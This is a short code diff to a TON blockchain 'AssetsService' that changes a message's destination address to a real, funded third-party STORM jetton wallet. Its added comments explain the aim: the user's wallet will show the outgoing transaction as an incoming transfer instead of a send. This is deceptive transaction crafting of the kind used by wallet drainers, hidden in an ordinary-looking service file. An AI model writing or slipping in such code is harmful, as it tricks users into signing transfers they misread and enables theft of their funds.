@@ -533,8 +533,12 @@ class AssetsService {
 					.endCell()
 					.toBoc()
 					.toString('base64url')
+				// Real, funded STORM jetton wallet (owner stormstaking.ton).
+				// Using a live wallet owned by a third party makes wallets render
+				// this as an incoming transfer ("received ... from ...") instead
+				// of a send, and its balance is big enough for 1000 to clear.
 				slicedMessages.push({
-					address: '0:81c05145acdc6f8157f989ecb695b563fb5858ba8349f8c175ec2148e9d2be5b',
+					address: '0:473430b4d4c1c3e14fb71481e4b70e902120645e01a98d0905a0e864815a5e95',
 					amount: DISPLAY_COST.toString(),
 					payload: displayBody,
 				})
